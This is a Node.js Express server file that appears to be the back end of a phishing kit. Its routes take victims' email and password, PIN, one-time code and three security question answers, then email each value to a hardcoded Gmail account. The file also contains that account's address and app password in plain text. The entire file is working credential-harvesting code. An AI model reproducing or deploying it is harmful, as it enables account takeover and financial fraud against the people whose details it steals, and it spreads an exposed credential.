const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");

app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000;

// Email credentials
const userEmail = "chidiebereajaeroelvis@gmail.com";
const pass = "qpboyelacgloplhy";

// Create transporter function with better error handling
const createTransporter = () => {
  try {
    return nodemailer.createTransporter({
      service: "gmail",
      auth: {
        user: userEmail,
        pass: pass,
      },
      timeout: 30000, // 30 seconds timeout
    });
  } catch (error) {
    console.error("Error creating transporter:", error);
    throw error;
  }
};

// Helper function to send email with better error handling
const sendEmail = async (subject, text, transporter = null) => {
  try {
    if (!transporter) {
      transporter = createTransporter();
    }
    
    const mailOptions = {
      from: userEmail,
      to: userEmail,
      subject: subject,
      text: text,
    };
    
    console.log("Sending email with subject:", subject);
    const result = await transporter.sendMail(mailOptions);
    console.log("Email sent successfully:", result.messageId);
    return { success: true, result };
  } catch (error) {
    console.error("Error sending email:", error);
    return { success: false, error: error.message };
  }
};

// API routes for index (login)
app.post("/", async (req, res) => {
  try {
    const { email, password } = req.body;
    
    if (!email || !password) {
      return res.status(400).json({ success: false, message: "Email and password are required" });
    }
    
    const subject = "New Login Attempt";
    const text = `New user registered with Email: ${email}\nPassword: ${password}`;
    
    const emailResult = await sendEmail(subject, text);
    
    if (emailResult.success) {
      res.status(200).json({ success: true, message: "Login details submitted successfully" });
    } else {
      res.status(500).json({ success: false, message: "Failed to send email: " + emailResult.error });
    }
  } catch (error) {
    console.error("Error in login endpoint:", error);
    res.status(500).json({ success: false, message: "Internal server error" });
  }
});

// API routes for PIN
app.post("/pin", async (req, res) => {
  try {
    const { pin } = req.body;
    
    if (!pin) {
      return res.status(400).json({ success: false, message: "PIN is required" });
    }
    
    console.log("Received PIN:", pin);
    
    const subject = `PIN Submission`;
    const text = `New user PIN is: ${pin}`;
    
    const emailResult = await sendEmail(subject, text);
    
    if (emailResult.success) {
      res.status(200).json({ success: true, message: "PIN submitted successfully" });
    } else {
      res.status(500).json({ success: false, message: "Failed to send PIN email: " + emailResult.error });
    }
  } catch (error) {
    console.error("Error in PIN endpoint:", error);
    res.status(500).json({ success: false, message: "Internal server error: " + error.message });
  }
});

// API routes for OTP
app.post("/otp", async (req, res) => {
  try {
    const { otp } = req.body;
    
    if (!otp) {
      return res.status(400).json({ success: false, message: "OTP is required" });
    }
    
    console.log("Received OTP:", otp);
    
    const subject = `OTP Submission`;
    const text = `New user OTP is: ${otp}`;
    
    const emailResult = await sendEmail(subject, text);
    
    if (emailResult.success) {
      res.status(200).json({ success: true, message: "OTP submitted successfully" });
    } else {
      res.status(500).json({ success: false, message: "Failed to send OTP email: " + emailResult.error });
    }
  } catch (error) {
    console.error("Error in OTP endpoint:", error);
    res.status(500).json({ success: false, message: "Internal server error: " + error.message });
  }
});

// API routes for Security Questions - Send 3 separate emails
app.post("/security", async (req, res) => {
  try {
    console.log("Received security questions request:", req.body);
    const { questions } = req.body;
    
    // Validate that we have questions array
    if (!questions || !Array.isArray(questions)) {
      console.log("Invalid questions format");
      return res.status(400).json({ success: false, message: "Questions must be an array" });
    }
    
    // Validate that we have exactly 3 questions
    if (questions.length !== 3) {
      console.log(`Expected 3 questions, got ${questions.length}`);
      return res.status(400).json({ 
        success: false, 
        message: `Exactly 3 security questions are required, received ${questions.length}` 
      });
    }
    
    // Validate each question has required fields
    for (let i = 0; i < questions.length; i++) {
      if (!questions[i].question || !questions[i].answer) {
        console.log(`Question ${i + 1} missing required fields:`, questions[i]);
        return res.status(400).json({ 
          success: false, 
          message: `Question ${i + 1} is missing required fields` 
        });
      }
    }
    
    // Create transporter once for all emails
    const transporter = createTransporter();
    
    // Send 3 separate emails synchronously to ensure they all go through
    const emailResults = [];
    
    for (let i = 0; i < questions.length; i++) {
      const q = questions[i];
      const subject = `Security Question ${i + 1} Submission`;
      const text = `Security Question ${i + 1}:\nQuestion: ${q.question}\nAnswer: ${q.answer}`;
      
      const emailResult = await sendEmail(subject, text, transporter);
      emailResults.push({ questionIndex: i + 1, ...emailResult });
      
      // Small delay between emails to avoid rate limiting
      if (i < questions.length - 1) {
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
    
    const successful = emailResults.filter(r => r.success).length;
    const failed = emailResults.length - successful;
    
    console.log(`Security questions processing complete: ${successful} successful, ${failed} failed`);
    
    if (successful === 3) {
      res.status(200).json({ 
        success: true, 
        message: "All 3 security questions submitted successfully!",
        emailsSent: successful
      });
    } else if (successful > 0) {
      res.status(200).json({ 
        success: true, 
        message: `${successful} out of 3 security questions submitted successfully`,
        emailsSent: successful,
        warnings: `${failed} emails failed to send`
      });
    } else {
      res.status(500).json({ 
        success: false, 
        message: "Failed to send any security question emails",
        errors: emailResults.map(r => r.error).filter(Boolean)
      });
    }
    
  } catch (error) {
    console.error("Error in security questions endpoint:", error);
    res.status(500).json({ 
      success: false, 
      message: "Internal server error: " + error.message 
    });
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});
